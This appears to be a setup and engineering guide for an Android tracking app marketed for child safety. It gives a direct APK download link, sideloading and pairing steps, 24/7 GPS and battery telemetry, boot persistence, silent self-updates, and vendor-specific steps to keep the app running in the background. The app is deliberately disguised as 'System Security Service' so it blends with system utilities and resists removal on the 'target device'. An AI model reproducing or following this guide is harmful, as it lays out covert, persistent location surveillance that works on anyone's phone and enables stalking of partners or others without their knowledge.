# 📱 SNAP APP — Kid Safety Companion App: Complete Engineering & Setup Guide

The **Safety Companion App** (`com.snapapp.companion`) is a native Android service designed for 24/7 background parental telemetry, GPS tracking, and remote security controls.

---

## 1. Overview & Core Features

- **App Label in System**: `System Security Service` (disguised discreetly on the target device).
- **Architecture**: Pure Java native Android application (`minSdkVersion 21` to `targetSdkVersion 34`).
- **Device Support**: 100% universal Android compatibility (Huawei/Honor, Samsung, Xiaomi, Oppo, Vivo, Google Pixel) with **zero Google Play Services dependencies**.

### Key Telemetry Capabilities:
1. **24/7 Background GPS Tracking**: Continuously fetches GPS coordinates via Android `LocationManager` and sends updates every 120 seconds.
2. **Battery & Power Telemetry**: Monitors real-time battery percentage and AC/USB charging state.
3. **On-Demand Remote Siren**: Triggers a loud alarm on the child's device remotely from the Admin Dashboard.
4. **Boot Auto-Restart**: Survives phone reboots and restarts tracking automatically via `BootReceiver`.
5. **Lifetime Auto-Update Engine**: In-app self-updater queries `/api/companion/version` and prompts 1-click APK updates.

---

## 2. Official Links & System Endpoints

| Resource / Action | URL / Endpoint | Purpose |
|---|---|---|
| **Direct APK Download** | `/api/downloads/companion` | Streams pre-signed 3MB APK with binary package headers |
| **Direct Static File** | `/downloads/snap-safety-companion.apk` | Physical binary file served by Vercel CDN |
| **Lifetime Update API** | `/api/companion/version` | Version checks and OTA update payload for companion apps |
| **Device Heartbeat API** | `/api/device-sync/heartbeat` | 6-digit code pairing & battery telemetry check-in |
| **GPS Telemetry API** | `/api/device-sync/location` | Ingests lat, lng, altitude, speed, and accuracy |
| **Admin Device Tracker** | `/admin/devices/[id]` | Real-time map, battery gauge, and remote siren controls |

---

## 3. Step-by-Step Setup & Pairing Walkthrough

### Step 1: Generate Device Pairing Code
1. Open Admin Dashboard at `https://snap-app-chi.vercel.app/admin/devices`.
2. Click **"Register New Device"** and enter the child's name (e.g. `Hamza Phone`).
3. Note the generated **6-digit pairing code** (e.g. `AB12CD`).

### Step 2: Download the Companion APK on Child's Device
- **Method A (QR Code)**: Click **"Pair with QR"** in dashboard and scan with the child's phone camera.
- **Method B (Direct Link)**: Open browser on the child's phone and visit:
  `https://snap-app-chi.vercel.app/api/downloads/companion`

### Step 3: Install the Package
1. Tap the downloaded `snap-safety-companion.apk` file (~3.0 MB).
2. If prompted, tap **"Settings"** and enable **"Allow from this source"**.
3. Tap **"Install"**. The app installs cleanly as **"System Security Service"**.

### Step 4: Activate & Protect
1. Open the app from the app drawer.
2. Enter the **6-digit pairing code** from Step 1.
3. Tap **"Activate & Protect"**.
4. When prompted by Android, grant **Location ("Allow all the time")** and **Notifications**.
5. The device status will switch to 🟢 **"Connected & Protected"**, and live telemetry will stream immediately to your Admin Map.

---

## 4. How the Lifetime Auto-Update Engine Works

```
Target Phone (Companion App)               SNAP APP Cloud (Vercel)
         │                                          │
         ├──── GET /api/companion/version ─────────►│ (Checks latest versionCode)
         │◄─── { version_code: 2, apk_url } ────────┤
         │
  [Version check: 2 > 1]
         │
         ├──── Downloads update.apk in background ─►│
         │
  [Triggers Android PackageInstaller via FileProvider]
         │
         ▼
User taps "Update" (All settings, device ID, & pairing remain preserved!)
```

Whenever you push code updates to `companion-android/`:
1. GitHub Actions automatically compiles the new APK binary via `.github/workflows/build-companion-apk.yml`.
2. The compiled binary is committed to `public/downloads/snap-safety-companion.apk`.
3. Existing installed apps detect the new build and prompt a 1-click update without re-entering the pairing code.

---

## 5. Background Persistence & Battery Optimization Whitelist

To ensure uninterrupted 24/7 background tracking on aggressive battery-saving devices (Honor/Huawei EMUI, Xiaomi MIUI, Samsung OneUI):

- **Honor / Huawei**: Go to *Settings → Battery → App Launch → System Security Service* → Set to **"Manage manually"** and enable *Auto-launch*, *Secondary launch*, and *Run in background*.
- **Samsung**: Go to *Settings → Apps → System Security Service → Battery* → Select **"Unrestricted"**.
- **Xiaomi**: Go to *Settings → Apps → Manage Apps → System Security Service* → Enable **"Autostart"** and set *Battery Saver* to **"No restrictions"**.

---

## 6. Troubleshooting & FAQs

- **Q: Why did older downloads show "Problem parsing package"?**
  **A**: Previous builds contained an uncompiled 136-byte placeholder text note. The new build is a genuine **3.0 MB compiled binary** with full DEX bytecode and certificates.
- **Q: Does it work without Google Play Services?**
  **A**: Yes. The app uses Android's native `LocationManager` and `HttpURLConnection`, which operate independently of Google Play Services.
- **Q: Can the child accidentally uninstall it?**
  **A**: The app is named "System Security Service" to blend with system utilities. For additional protection, enable Android Pin App / Screen Lock pinning or set up Family Link app locks.
